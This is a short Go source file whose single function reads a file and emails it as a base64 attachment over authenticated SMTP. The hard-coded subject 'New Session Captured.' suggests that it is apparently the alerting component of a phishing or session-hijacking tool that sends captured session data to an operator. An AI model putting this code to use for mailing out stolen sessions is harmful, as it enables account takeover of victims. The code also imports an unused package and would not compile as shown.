package main

import (
	"fmt"
	"net/smtp"
	"strconv"
	"bytes"
	"mime/multipart"
	"mime/quotedprintable"
	"crypto/sha1"
	"encoding/base64"
	"io/ioutil"
	"os"
)

func sendMailNotificationWithAttachment(smtpHost string, smtpPort int, smtpUser, smtpPassword, to, body, attachmentPath string) error {
	auth := smtp.PlainAuth("", smtpUser, smtpPassword, smtpHost)
	smtpAddress := smtpHost + ":" + strconv.Itoa(smtpPort)
	from := fmt.Sprintf("%s", smtpUser)
	subject := "New Session Captured."

	// Read the attachment file
	attachmentData, err := ioutil.ReadFile(attachmentPath)
	if err != nil {
		fmt.Println("Failed to read attachment file:", err)
		return err
	}

	// Create MIME boundary for the email
	boundary := "----=_Part_" + strconv.Itoa(int(sha1.New().Size())) + "_Boundary"

	// Create the email content
	var msgBuffer bytes.Buffer

	// MIME headers and body
	msgBuffer.WriteString("From: " + from + "\n")
	msgBuffer.WriteString("To: " + to + "\n")
	msgBuffer.WriteString("Subject: " + subject + "\n")
	msgBuffer.WriteString("MIME-Version: 1.0\n")
	msgBuffer.WriteString("Content-Type: multipart/mixed; boundary=\"" + boundary + "\"\n\n")
	msgBuffer.WriteString("--" + boundary + "\n")
	msgBuffer.WriteString("Content-Type: text/plain; charset=\"utf-8\"\n")
	msgBuffer.WriteString("Content-Transfer-Encoding: quoted-printable\n\n")

	// Body of the email (quoted-printable encoding)
	encoder := quotedprintable.NewWriter(&msgBuffer)
	encoder.Write([]byte(body))
	encoder.Close()

	// Attachment section
	msgBuffer.WriteString("--" + boundary + "\n")
	msgBuffer.WriteString("Content-Type: application/octet-stream; name=\"" + attachmentPath + "\"\n")
	msgBuffer.WriteString("Content-Transfer-Encoding: base64\n")
	msgBuffer.WriteString("Content-Disposition: attachment; filename=\"" + attachmentPath + "\"\n\n")

	// Encode the attachment as base64
	encodedAttachment := base64.StdEncoding.EncodeToString(attachmentData)
	msgBuffer.WriteString(encodedAttachment + "\n")
	msgBuffer.WriteString("--" + boundary + "--")

	// Send the email
	err = smtp.SendMail(smtpAddress, auth, from, []string{to}, msgBuffer.Bytes())
	if err != nil {
		fmt.Println("Failed to send email:", err)
		return err
	}
	fmt.Println("Email sent successfully.")
	return nil
}
